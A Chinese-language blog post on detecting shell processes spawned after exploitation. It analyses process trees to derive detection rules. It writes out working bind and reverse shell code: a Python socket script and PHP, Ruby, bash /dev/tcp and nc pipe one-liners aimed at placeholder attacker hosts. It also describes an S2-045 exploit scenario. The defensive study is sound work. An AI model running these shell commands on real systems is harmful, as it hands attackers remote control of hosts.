---
layout: post
title:  "异常进程检测（getshell）的场景分析和发现方法"
date: 2017-05-16 18:06:26 +0800
author: Mushen
categories: original
---

为了能识别主机上被攻击者利用漏洞后获取的shell进程，整理了网络上常见的正向或反向shell的姿势技巧。在测试环境中设计和模拟了集中getshell的场景，并分析这些场景下进程的派生与继承关系。

### 获得shell的姿势
1.一段python脚本
{% highlight python %}
from socket import *
import subprocess
import os, threading, sys, time
if __name__ == "__main__":
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(('0.0.0.0',1234))
        server.listen(5)
        print 'waiting for connect'
        talk, addr = server.accept()
        print 'connect from',addr
        proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,
                stdout=talk, stderr=talk, shell=True)

{% endhighlight %}

观察进程的派生关系，通过监听的端口找到模拟攻击者的shell进程，这个pid为5359的进程在进程树上是init进程的子进程，这是一个比较明显的异常信号。这是一个正向连接的脚本，即服务器开放一个监听端口让攻击者连接。这个脚本fork出一个子进程，当用户连接上以后就结束主进程。子进程由init接管，pid变成1。而通常，bash、sh等shell或者perl、python、ruby、lua等程序语言一定是由bash、ssh、login等程序派生出来的。


![abnormal-proc-detection-001.png](/assets/img/abnormal-proc-detection-001.png)

2.一句php命令
```
php -r '$sock=fsockopen("127.0.0.1",12345 );exec("/bin/sh -i <&3 >&3 2>&3");'
```


php命令以文件的形式创建一个socket并监听端口，正向连接，同步调用sh。在进程树上，是一个php进程派生出一个sh。对于检测者，是比较理想的一种情况。


![abnormal-proc-detection-002.png](/assets/img/abnormal-proc-detection-002.png)

3.一句ruby命令

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","4321");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```


ruby创建一个反向连接，与python脚本一样，完成连接后ruby主进程退出，子进程由init接管。与python不同的是，这句命令直接使用ruby IO模块中的方法与操作系统交互，没有调用shell。（也有调用shell的命令。）如果删除了"exit if fork;"这句，则变成bash派生出的ruby进程，检测难度就变大了。


![abnormal-proc-detection-003.png](/assets/img/abnormal-proc-detection-003.png)
上图是有exit if fork;的情况


![abnormal-proc-detection-004.png](/assets/img/abnormal-proc-detection-004.png)
上图是没有exit if fork;的情况

4.一句话bash反弹shell
```
bash -i >& /dev/tcp/attacker's_ip/attacer's_port 0>&1
```
这种写法从进程间的关系上看不出异常，但是因为一般会利用某种应用的漏洞执行shell命令，所以还是有办法检测的。


5.利用nc反弹shell
a 使用管道的方式

```
mknod backpipe p && nc attackerip 8080 0<backpipe | /bin/bash 1>backpipe

/bin/sh | nc attackerip 4444

```
b 使用nc的-e参数

由于没有找到合适的测试环境，没有测试成功，线上环境编译的nc一般不包含-e参数，风险较小（实际上在入侵的时候几乎从来没有执行成功过）。

### 检测规则

1.父进程为某个守护进程（web应用、数据库、自研应用），子进程为bash、ash、ksh……

2.父进程为某个守护程序或程序语言，子进程为另一种程序语言。例如java派生出perl。

2.init派生的bash、ash、ksh……等等。（PHP、ruby、perl也要监控，但鉴于很多监控工具使用python编写，如果检测init直接派生的python会有大量误报的问题）

3.nc程序进程，出现了管道或者-e参数

以上是特征非常明显的进程状态，以下还有两条可以作为辅助的特征，但最好不要独立使用，因为会有很多误报。

1.子进程的创建时间与父进程相差很远（同时又不是周期性的），除非父进程是init的情况

2.bash建立了socket

其实还有一些规则是我没想到的，欢迎大家补充。可以发邮件给我wangzf0225#gmail.com

### 模拟一个场景
例子：利用S2-045漏洞反弹shell

使用medicean的docker镜像创建了一个包含S2-042的典型利用场景的环境。利用exp成功执行命令"bash -i >& /dev/tcp/attacker's_ip/attacer's_port 0>&1"弹回shell，观察进程树：
![abnormal-proc-detection-005.png](/assets/img/abnormal-proc-detection-005.png)

发现这是一个比较典型的java派生bash子进程的情况。

当然，有时也会通过调用另一个语言程序实现反弹。
![abnormal-proc-detection-006.png](/assets/img/abnormal-proc-detection-006.png)


### PS 补充一点

pstree命令以默认方式输出所有进程，其中一部分进程pid使用pa aux中无法找到。这部分进程名通常用一对花括号包围，例如"{process}"。这是因为pstree默认输出所有的进程信息，而ps aux只输出一部分（尽管名义上输出全部）。使用ps -eLf可以看到所有的进程信息，实际上，而没有被显示的这部分进程的pid在ps -eLf中叫做LWP，即light weight process，也就是线程（thread）。
